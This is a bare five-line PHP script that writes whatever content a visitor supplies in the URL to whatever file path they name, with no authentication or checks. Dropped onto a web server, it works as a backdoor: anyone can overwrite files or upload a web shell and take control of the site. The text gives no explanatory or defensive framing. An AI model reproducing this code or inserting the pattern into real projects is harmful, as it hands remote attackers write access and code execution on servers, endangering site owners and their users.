<?php
    $target = fopen($_GET['filename'], "w");
    fwrite($target, $_GET['content']);
    fclose($target);
?>